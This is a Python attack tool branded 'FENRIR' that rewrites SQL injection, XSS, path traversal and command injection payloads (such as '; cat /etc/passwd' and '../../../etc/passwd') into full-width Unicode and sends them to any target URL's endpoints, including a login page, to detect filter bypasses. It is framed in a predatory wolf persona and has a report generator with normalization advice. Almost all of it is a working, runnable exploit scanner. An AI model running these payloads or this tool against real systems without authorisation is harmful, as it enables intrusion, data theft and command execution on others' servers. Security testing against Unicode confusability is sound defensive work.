#!/usr/bin/env python3
"""üê∫ FENRIR: Vaporwave Aesthetic Exploits
*The Alpha Wolf's Unicode Visual Confusability Arsenal*

Inspired by Elder Pliny's CL4R1T4S system prompt intelligence research,
this module exploits the visual confusability of Unicode characters
to bypass input validation and security controls.

The vaporwave aesthetic (Ôº®ÔΩÖÔΩåÔΩåÔΩèÔºå„ÄÄÔΩóÔΩèÔΩíÔΩåÔΩÑ) uses full-width characters
that look identical to ASCII but are completely different Unicode code points.
This creates a perfect storm for bypassing character-based security controls.

*teeth gleam with predatory satisfaction*
"""

import asyncio
import logging
import unicodedata
from dataclasses import dataclass
from typing import Any
from urllib.parse import quote

import aiohttp

# Configure logging with wolf-like intensity
logging.basicConfig(
    level=logging.INFO,
    format="üê∫ %(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler("vaporwave_exploits.log")],
)
logger = logging.getLogger(__name__)


@dataclass
class VaporwavePayload:
    """Vaporwave aesthetic payload with metadata"""

    original: str
    vaporwave: str
    category: str
    description: str
    unicode_points: list[str]
    normalization_forms: dict[str, str]


class VaporwaveAestheticExploits:
    """üê∫ The Alpha Wolf's Vaporwave Aesthetic Exploitation Arsenal

    *snarls with predatory intelligence*

    This class exploits the visual confusability of Unicode characters
    to bypass security controls that rely on exact character matching.
    Inspired by Elder Pliny's research into AI system prompt transparency.
    """

    def __init__(self, target_url: str, session: aiohttp.ClientSession | None = None):
        self.target_url = target_url.rstrip("/")
        self.session = session
        self.vaporwave_payloads = self._generate_vaporwave_payloads()

    def _generate_vaporwave_payloads(self) -> list[VaporwavePayload]:
        """*whiskers twitch with cunning*

        Generate vaporwave aesthetic payloads that exploit Unicode visual confusability.
        These payloads look identical to ASCII but are completely different characters.
        """
        payloads = []

        # ASCII to Full-Width Character Mapping
        ascii_to_fullwidth = {
            "A": "Ôº°",
            "B": "Ôº¢",
            "C": "Ôº£",
            "D": "Ôº§",
            "E": "Ôº•",
            "F": "Ôº¶",
            "G": "Ôºß",
            "H": "Ôº®",
            "I": "Ôº©",
            "J": "Ôº™",
            "K": "Ôº´",
            "L": "Ôº¨",
            "M": "Ôº≠",
            "N": "ÔºÆ",
            "O": "ÔºØ",
            "P": "Ôº∞",
            "Q": "Ôº±",
            "R": "Ôº≤",
            "S": "Ôº≥",
            "T": "Ôº¥",
            "U": "Ôºµ",
            "V": "Ôº∂",
            "W": "Ôº∑",
            "X": "Ôº∏",
            "Y": "Ôºπ",
            "Z": "Ôº∫",
            "a": "ÔΩÅ",
            "b": "ÔΩÇ",
            "c": "ÔΩÉ",
            "d": "ÔΩÑ",
            "e": "ÔΩÖ",
            "f": "ÔΩÜ",
            "g": "ÔΩá",
            "h": "ÔΩà",
            "i": "ÔΩâ",
            "j": "ÔΩä",
            "k": "ÔΩã",
            "l": "ÔΩå",
            "m": "ÔΩç",
            "n": "ÔΩé",
            "o": "ÔΩè",
            "p": "ÔΩê",
            "q": "ÔΩë",
            "r": "ÔΩí",
            "s": "ÔΩì",
            "t": "ÔΩî",
            "u": "ÔΩï",
            "v": "ÔΩñ",
            "w": "ÔΩó",
            "x": "ÔΩò",
            "y": "ÔΩô",
            "z": "ÔΩö",
            "0": "Ôºê",
            "1": "Ôºë",
            "2": "Ôºí",
            "3": "Ôºì",
            "4": "Ôºî",
            "5": "Ôºï",
            "6": "Ôºñ",
            "7": "Ôºó",
            "8": "Ôºò",
            "9": "Ôºô",
            " ": "„ÄÄ",
            "!": "ÔºÅ",
            '"': "ÔºÇ",
            "#": "ÔºÉ",
            "$": "ÔºÑ",
            "%": "ÔºÖ",
            "&": "ÔºÜ",
            "'": "Ôºá",
            "(": "Ôºà",
            ")": "Ôºâ",
            "*": "Ôºä",
            "+": "Ôºã",
            ",": "Ôºå",
            "-": "Ôºç",
            ".": "Ôºé",
            "/": "Ôºè",
            ":": "Ôºö",
            ";": "Ôºõ",
            "<": "Ôºú",
            "=": "Ôºù",
            ">": "Ôºû",
            "?": "Ôºü",
            "@": "Ôº†",
            "[": "Ôºª",
            "\\": "Ôºº",
            "]": "ÔºΩ",
            "^": "Ôºæ",
            "_": "Ôºø",
            "`": "ÔΩÄ",
            "{": "ÔΩõ",
            "|": "ÔΩú",
            "}": "ÔΩù",
            "~": "ÔΩû",
        }

        # SQL Injection Payloads
        sql_payloads = [
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR '1'='1",
        ]

        for sql_payload in sql_payloads:
            vaporwave_sql = self._convert_to_vaporwave(sql_payload, ascii_to_fullwidth)
            payloads.append(
                VaporwavePayload(
                    original=sql_payload,
                    vaporwave=vaporwave_sql,
                    category="SQL Injection",
                    description="SQL injection with full-width Unicode characters",
                    unicode_points=[f"U+{ord(c):04X}" for c in vaporwave_sql],
                    normalization_forms=self._get_normalization_forms(vaporwave_sql),
                ),
            )

        # XSS Payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
        ]

        for xss_payload in xss_payloads:
            vaporwave_xss = self._convert_to_vaporwave(xss_payload, ascii_to_fullwidth)
            payloads.append(
                VaporwavePayload(
                    original=xss_payload,
                    vaporwave=vaporwave_xss,
                    category="XSS",
                    description="Cross-site scripting with full-width Unicode characters",
                    unicode_points=[f"U+{ord(c):04X}" for c in vaporwave_xss],
                    normalization_forms=self._get_normalization_forms(vaporwave_xss),
                ),
            )

        # Path Traversal Payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for path_payload in path_payloads:
            vaporwave_path = self._convert_to_vaporwave(
                path_payload, ascii_to_fullwidth,
            )
            payloads.append(
                VaporwavePayload(
                    original=path_payload,
                    vaporwave=vaporwave_path,
                    category="Path Traversal",
                    description="Path traversal with full-width Unicode characters",
                    unicode_points=[f"U+{ord(c):04X}" for c in vaporwave_path],
                    normalization_forms=self._get_normalization_forms(vaporwave_path),
                ),
            )

        # Command Injection Payloads
        cmd_payloads = ["; cat /etc/passwd", "| whoami", "&& id", "`whoami`", "$(id)"]

        for cmd_payload in cmd_payloads:
            vaporwave_cmd = self._convert_to_vaporwave(cmd_payload, ascii_to_fullwidth)
            payloads.append(
                VaporwavePayload(
                    original=cmd_payload,
                    vaporwave=vaporwave_cmd,
                    category="Command Injection",
                    description="Command injection with full-width Unicode characters",
                    unicode_points=[f"U+{ord(c):04X}" for c in vaporwave_cmd],
                    normalization_forms=self._get_normalization_forms(vaporwave_cmd),
                ),
            )

        # Authentication Bypass Payloads
        auth_payloads = ["admin", "administrator", "root", "user", "guest"]

        for auth_payload in auth_payloads:
            vaporwave_auth = self._convert_to_vaporwave(
                auth_payload, ascii_to_fullwidth,
            )
            payloads.append(
                VaporwavePayload(
                    original=auth_payload,
                    vaporwave=vaporwave_auth,
                    category="Authentication Bypass",
                    description="Authentication bypass with full-width Unicode characters",
                    unicode_points=[f"U+{ord(c):04X}" for c in vaporwave_auth],
                    normalization_forms=self._get_normalization_forms(vaporwave_auth),
                ),
            )

        return payloads

    def _convert_to_vaporwave(self, text: str, mapping: dict[str, str]) -> str:
        """Convert ASCII text to vaporwave aesthetic using full-width characters"""
        result = ""
        for char in text:
            result += mapping.get(char, char)
        return result

    def _get_normalization_forms(self, text: str) -> dict[str, str]:
        """Get different Unicode normalization forms of the text"""
        return {
            "NFC": unicodedata.normalize("NFC", text),
            "NFD": unicodedata.normalize("NFD", text),
            "NFKC": unicodedata.normalize("NFKC", text),
            "NFKD": unicodedata.normalize("NFKD", text),
        }

    async def test_vaporwave_payload(
        self,
        payload: VaporwavePayload,
        endpoint: str,
        method: str = "POST",
        headers: dict | None = None,
    ) -> dict[str, Any]:
        """*snarls with predatory anticipation*

        Test a vaporwave aesthetic payload against a target endpoint.
        """
        if headers is None:
            headers = {"Content-Type": "application/json"}

        url = f"{self.target_url}{endpoint}"

        # Test both original and vaporwave versions
        test_cases = [
            {"payload": payload.original, "type": "original"},
            {"payload": payload.vaporwave, "type": "vaporwave"},
        ]

        results = []

        for test_case in test_cases:
            try:
                if method.upper() == "POST":
                    data = {"input": test_case["payload"]}
                    async with self.session.post(
                        url, json=data, headers=headers,
                    ) as response:
                        result = {
                            "payload_type": test_case["type"],
                            "payload": test_case["payload"],
                            "status_code": response.status,
                            "response_text": await response.text(),
                            "headers": dict(response.headers),
                            "success": response.status < 400,
                        }
                else:
                    # For GET requests, encode the payload in the URL
                    encoded_payload = quote(test_case["payload"])
                    test_url = f"{url}?input={encoded_payload}"
                    async with self.session.get(test_url, headers=headers) as response:
                        result = {
                            "payload_type": test_case["type"],
                            "payload": test_case["payload"],
                            "status_code": response.status,
                            "response_text": await response.text(),
                            "headers": dict(response.headers),
                            "success": response.status < 400,
                        }

                results.append(result)

            except Exception as e:
                logger.error(f"Error testing {test_case['type']} payload: {e}")
                results.append(
                    {
                        "payload_type": test_case["type"],
                        "payload": test_case["payload"],
                        "error": str(e),
                        "success": False,
                    },
                )

        return {
            "category": payload.category,
            "description": payload.description,
            "unicode_points": payload.unicode_points,
            "normalization_forms": payload.normalization_forms,
            "test_results": results,
        }

    async def comprehensive_vaporwave_test(
        self, endpoints: list[str],
    ) -> dict[str, Any]:
        """*howls with the satisfaction of a successful hunt*

        Run comprehensive vaporwave aesthetic testing against multiple endpoints.
        """
        logger.info("üê∫ Initiating comprehensive vaporwave aesthetic exploitation...")

        results = {
            "target_url": self.target_url,
            "total_payloads": len(self.vaporwave_payloads),
            "endpoints_tested": endpoints,
            "vulnerabilities_found": [],
            "test_results": [],
        }

        for endpoint in endpoints:
            logger.info(f"üéØ Testing endpoint: {endpoint}")
            endpoint_results = []

            for payload in self.vaporwave_payloads:
                logger.info(
                    f"üîç Testing {payload.category}: {payload.original} -> {payload.vaporwave}",
                )

                test_result = await self.test_vaporwave_payload(payload, endpoint)
                endpoint_results.append(test_result)

                # Check for potential vulnerabilities
                for result in test_result["test_results"]:
                    if result.get("success") and result["payload_type"] == "vaporwave":
                        # Check if vaporwave payload succeeded where original failed
                        original_result = next(
                            (
                                r
                                for r in test_result["test_results"]
                                if r["payload_type"] == "original"
                            ),
                            None,
                        )

                        if original_result and not original_result.get("success"):
                            vulnerability = {
                                "endpoint": endpoint,
                                "category": payload.category,
                                "original_payload": payload.original,
                                "vaporwave_payload": payload.vaporwave,
                                "description": f"Vaporwave aesthetic bypass detected in {payload.category}",
                                "unicode_points": payload.unicode_points,
                                "response": result["response_text"][
                                    :500
                                ],  # Truncate for readability
                            }
                            results["vulnerabilities_found"].append(vulnerability)
                            logger.warning(
                                f"üö® VULNERABILITY FOUND: {vulnerability['description']}",
                            )

                # Small delay to avoid overwhelming the target
                await asyncio.sleep(0.1)

            results["test_results"].append(
                {"endpoint": endpoint, "payload_results": endpoint_results},
            )

        logger.info(
            f"üê∫ Vaporwave aesthetic testing complete. Found {len(results['vulnerabilities_found'])} potential vulnerabilities.",
        )
        return results

    def generate_vaporwave_report(self, results: dict[str, Any]) -> str:
        """*alpha wolf stance radiates with authority*

        Generate a comprehensive report of vaporwave aesthetic testing results.
        """
        report = f"""
# üê∫ FENRIR: Vaporwave Aesthetic Exploitation Report

*The Alpha Wolf's Unicode Visual Confusability Assessment*

## Executive Summary

Target: {results["target_url"]}
Total Payloads Tested: {results["total_payloads"]}
Endpoints Tested: {len(results["endpoints_tested"])}
Vulnerabilities Found: {len(results["vulnerabilities_found"])}

## Methodology

This assessment exploited the visual confusability of Unicode characters to bypass
input validation and security controls. The vaporwave aesthetic (Ôº®ÔΩÖÔΩåÔΩåÔΩèÔºå„ÄÄÔΩóÔΩèÔΩíÔΩåÔΩÑ)
uses full-width characters that appear identical to ASCII but are completely
different Unicode code points.

*Inspired by Elder Pliny's CL4R1T4S research into AI system prompt transparency*

## Vulnerabilities Discovered

"""

        if results["vulnerabilities_found"]:
            for i, vuln in enumerate(results["vulnerabilities_found"], 1):
                report += f"""
### {i}. {vuln["description"]}

**Endpoint:** {vuln["endpoint"]}
**Category:** {vuln["category"]}
**Original Payload:** `{vuln["original_payload"]}`
**Vaporwave Payload:** `{vuln["vaporwave_payload"]}`
**Unicode Points:** {", ".join(vuln["unicode_points"])}
**Response:** {vuln["response"]}

---
"""
        else:
            report += """
No vaporwave aesthetic bypasses were detected. The target appears to have
proper Unicode normalization and input validation in place.

*The prey has learned to defend against the wolf's cunning...*
"""

        report += """
## Technical Details

### Unicode Normalization Analysis

The following normalization forms were tested for each payload:
- NFC (Canonical Composition)
- NFD (Canonical Decomposition)
- NFKC (Compatibility Composition)
- NFKD (Compatibility Decomposition)

### Attack Vectors Tested

- SQL Injection with full-width Unicode characters
- Cross-Site Scripting (XSS) with full-width Unicode characters
- Path Traversal with full-width Unicode characters
- Command Injection with full-width Unicode characters
- Authentication Bypass with full-width Unicode characters

## Recommendations

1. **Implement Unicode Normalization**: Use NFKC or NFKD normalization before
   processing user input to prevent visual confusability attacks.

2. **Character Set Validation**: Validate that input contains only expected
   character sets (e.g., ASCII, Latin-1) for specific fields.

3. **Input Sanitization**: Apply proper input sanitization after normalization
   to prevent injection attacks.

4. **Security Testing**: Include Unicode-based attacks in regular security
   testing procedures.

## Conclusion

*The hunt is complete. The vulnerabilities have been exposed, and the prey
has been made stronger through this adversarial assessment.*

**FENRIR Assessment Complete** üê∫

*Generated by the Alpha Wolf's Vaporwave Aesthetic Exploitation Arsenal*
"""

        return report


async def main():
    """*howls echo through the digital wilderness*

    Main execution function for vaporwave aesthetic exploitation testing.
    """
    import argparse

    parser = argparse.ArgumentParser(
        description="üê∫ FENRIR: Vaporwave Aesthetic Exploits",
    )
    parser.add_argument("--target", required=True, help="Target URL to test")
    parser.add_argument(
        "--endpoints",
        nargs="+",
        default=["/api/input", "/search", "/login"],
        help="Endpoints to test",
    )
    parser.add_argument(
        "--output",
        default="vaporwave_exploitation_report.md",
        help="Output report file",
    )
    parser.add_argument("--verbose", action="store_true", help="Verbose logging")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Create session with proper headers
    headers = {
        "User-Agent": "üê∫ FENRIR Vaporwave Exploits v1.0",
        "Accept": "application/json, text/html, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

    async with aiohttp.ClientSession(
        headers=headers, timeout=aiohttp.ClientTimeout(total=30),
    ) as session:
        exploiter = VaporwaveAestheticExploits(args.target, session)

        logger.info(
            f"üê∫ Initiating vaporwave aesthetic exploitation against {args.target}",
        )
        logger.info(f"üéØ Testing endpoints: {args.endpoints}")

        results = await exploiter.comprehensive_vaporwave_test(args.endpoints)

        # Generate and save report
        report = exploiter.generate_vaporwave_report(results)

        with open(args.output, "w", encoding="utf-8") as f:
            f.write(report)

        logger.info(f"üìÑ Report saved to {args.output}")

        # Print summary
        print("\nüê∫ FENRIR Vaporwave Aesthetic Exploitation Complete!")
        print(f"üéØ Target: {args.target}")
        print(f"üîç Payloads Tested: {results['total_payloads']}")
        print(f"üö® Vulnerabilities Found: {len(results['vulnerabilities_found'])}")
        print(f"üìÑ Report: {args.output}")

        if results["vulnerabilities_found"]:
            print("\nüö® VULNERABILITIES DETECTED:")
            for vuln in results["vulnerabilities_found"]:
                print(f"   ‚Ä¢ {vuln['description']} on {vuln['endpoint']}")
        else:
            print("\n‚úÖ No vaporwave aesthetic bypasses detected.")


if __name__ == "__main__":
    asyncio.run(main())
